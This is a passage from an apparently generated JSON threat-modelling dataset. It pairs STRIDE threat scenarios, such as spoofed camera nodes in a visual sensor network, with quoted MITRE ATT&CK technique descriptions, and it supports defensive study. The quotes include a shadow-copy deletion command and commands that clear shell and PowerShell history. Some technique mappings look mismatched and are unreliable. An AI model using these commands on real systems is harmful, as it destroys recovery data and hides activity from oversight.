                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of JVM deserialization vulnerabilities to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The system uses vulnerable JVM components.",
                    "Role": "Developer",
                    "Condition": "Outdated or vulnerable libraries."
                },
                {
                    "Assumption": "Untrusted data is deserialized by these components.",
                    "Role": "System Admin",
                    "Condition": "Improper data handling controls."
                },
                {
                    "Assumption": "No sandboxing or isolation of deserialized code.",
                    "Role": "System Designer",
                    "Condition": "Lack of containment measures."
                }
            ],
            "Potential Impact": "Gaining elevated privileges and executing unauthorized actions on the system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "deserialization",
                "JVM",
                "arbitrary code execution"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits firmware upgrading mechanisms to upload a malicious firmware with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Firmware upgrade processes lack proper validation.",
                    "Role": "System Designer",
                    "Condition": "Weak update validation procedures."
                },
                {
                    "Assumption": "Firmware updates are conducted over unsecured channels.",
                    "Role": "System Admin",
                    "Condition": "Use of insecure communication channels."
                },
                {
                    "Assumption": "The attacker has access to perform firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Compromised or weak credentials."
                }
            ],
            "Potential Impact": "Exploiting firmware with elevated access, leading to full control over device operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "update mechanism",
                "malicious firmware"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate camera node in the Visual Sensor Network (VSN) to inject malicious images or videos.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network and can communicate with the camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid when the network is not fully secured."
                },
                {
                    "Assumption": "The authentication mechanisms between nodes are weak or absent.",
                    "Role": "System Designer",
                    "Condition": "Valid if proper authentication protocols are not implemented."
                },
                {
                    "Assumption": "The attacker has knowledge of the network topology and communication protocols.",
                    "Role": "Attacker",
                    "Condition": "Valid when network security details are leaked or easily discoverable."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of visual data and potential surveillance system failure.",
            "MITRE ATT&CK Keywords": [
                "network",
                "spoofing",
                "device",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized user could use stolen credentials to access the VSN management interface.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are stored in an insecure manner.",
                    "Role": "System Administrator",
                    "Condition": "Valid when credentials are not encrypted or securely stored."
                },
                {
                    "Assumption": "The attacker has access to phishing tools or social engineering techniques.",
                    "Role": "Attacker",
                    "Condition": "Valid in environments where users are not adequately trained on phishing risks."
                },
                {
                    "Assumption": "The management interface lacks multi-factor authentication.",
                    "Role": "System Designer",
                    "Condition": "Valid if the application does not implement MFA."
                }
            ],
            "Potential Impact": "Unauthorized control over the VSN, leading to potential privacy violations and data breaches.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "spoofing",
                "phishing",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A compromised DNS server could direct VSN nodes to a malicious control server.",
            "Assumptions": [
                {
                    "Assumption": "DNS traffic is not protected or monitored.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if DNS security protocols like DNSSEC are not used."
                },
                {
                    "Assumption": "The attacker can manipulate DNS entries in the network.",
                    "Role": "Attacker",
                    "Condition": "Valid in networks with weak DNS server security."
                },
                {
                    "Assumption": "There is no integrity checking mechanism for server communications.",
                    "Role": "System Designer",
                    "Condition": "Valid if secure communication channels like TLS are not implemented."
                }
            ],
            "Potential Impact": "Redirection of communication to malicious servers, leading to data theft and command injection.",
            "MITRE ATT&CK Keywords": [
                "dns",
                "spoofing",
                "network",
                "redirection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of camera nodes to alter their behavior or leak data.",
            "Assumptions": [
                {
                    "Assumption": "The firmware update mechanism lacks authentication and integrity checks.",
                    "Role": "System Designer",
                    "Condition": "Valid if updates can be applied without verification."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the camera nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security controls are weak or remote access points are unprotected."
                },
                {
                    "Assumption": "There is no monitoring for abnormal firmware behavior.",
                    "Role": "System Administrator",
                    "Condition": "Valid if behavior anomaly detection is not implemented."
                }
            ],
            "Potential Impact": "Compromise of data integrity and availability, leading to potential data leaks and system failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "modification"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors injecting false data packets into the VSN to corrupt the visual data stream.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted or authenticated.",
                    "Role": "System Designer",
                    "Condition": "Valid if data packets can be intercepted and modified."
                },
                {
                    "Assumption": "The attacker has access to the communication channels of the VSN.",
                    "Role": "Attacker",
                    "Condition": "Valid in cases of unsecured communication channels."
                },
                {
                    "Assumption": "There are no integrity checks for transmitted data.",
                    "Role": "System Administrator",
                    "Condition": "Valid if data integrity verification mechanisms are absent."
                }
            ],
            "Potential Impact": "Loss of data integrity, resulting in false or corrupted visual data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "injection",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized physical access to camera nodes to alter their configuration.",
            "Assumptions": [
                {
                    "Assumption": "Physical security measures are inadequate.",
                    "Role": "System Designer",
                    "Condition": "Valid if camera nodes are easily accessible."
                },
                {
                    "Assumption": "Configuration interfaces are not protected by strong authentication methods.",
                    "Role": "System Administrator",
                    "Condition": "Valid if configurations can be altered without authentication."
                },
                {
                    "Assumption": "There is no logging or alerting mechanism for configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Valid if security event monitoring is not in place."
                }
            ],
            "Potential Impact": "Configuration tampering can lead to functional disruptions or data leaks.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "device",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users denying actions performed within the VSN due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "The system does not implement comprehensive logging and audit trails.",
                    "Role": "System Designer",
                    "Condition": "Valid if logs are not kept or are easily altered."
                },
                {
                    "Assumption": "There is no user activity monitoring or authentication logs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if user actions are not being recorded."
                },
                {
                    "Assumption": "The logging mechanism can be easily disabled or bypassed.",
                    "Role": "Attacker",
                    "Condition": "Valid if security controls over logging are weak."
                }
            ],
            "Potential Impact": "Loss of accountability and difficulty in incident response.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "audit",
                "repudiation",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Executable scripts or commands being run without clear attribution to a user.",
            "Assumptions": [
                {
                    "Assumption": "Script execution is not logged with user context.",
                    "Role": "System Designer",
                    "Condition": "Valid if scripts can run anonymously."
                },
                {
                    "Assumption": "The system does not enforce strict user identification for command execution.",
                    "Role": "System Administrator",
                    "Condition": "Valid if commands can be run without clear user attribution."
                },
                {
                    "Assumption": "There is no non-repudiation mechanism such as digital signatures.",
                    "Role": "System Designer",
                    "Condition": "Valid if additional verification measures are absent."
                }
            ],
            "Potential Impact": "Difficulty in tracing malicious activities back to specific users.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "scripts",
                "commands",
                "execution"
            ],
            "mitre_technique": {
                "name": "Windows Management Instrumentation",
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
                "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
                "technique_id": "T1047"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Modifying system or application logs to erase traces of malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Logs can be modified or deleted without detection.",
                    "Role": "System Administrator",
                    "Condition": "Valid if log integrity mechanisms are not in place."
                },
                {
                    "Assumption": "There is no real-time log monitoring or alerting system.",
                    "Role": "System Administrator",
                    "Condition": "Valid if log modifications do not generate alerts."
                },
                {
                    "Assumption": "The attacker has sufficient privileges to access and modify logs.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak."
                }
            ],
            "Potential Impact": "Compromised accountability and challenges in forensic investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "log deletion",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data intercepted during transmission between camera nodes and servers.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption protocols are not utilized."
                },
                {
                    "Assumption": "The attacker has access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid in unsecured or poorly monitored networks."
                },
                {
                    "Assumption": "There are no perimeter defenses preventing unauthorized network access.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if the network lacks sufficient security measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive visual data may lead to privacy breaches or competitive threats.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "network",
                "sensitive data",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exploit of known vulnerabilities in the Linux OS used by VSN nodes to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The systems are not patched or updated regularly.",
                    "Role": "System Administrator",
                    "Condition": "Valid if vulnerability management is poor."
                },
                {
                    "Assumption": "Vulnerable services are exposed to the internet.",
                    "Role": "System Designer",
                    "Condition": "Valid if proper network segmentation is not implemented."
                },
                {
                    "Assumption": "Attackers have means to discover and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid in the presence of freely available exploit kits."
                }
            ],
            "Potential Impact": "Exploitation can lead to data theft, unauthorized access, and potential system control.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "linux",
                "sensitive data",
                "system access"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
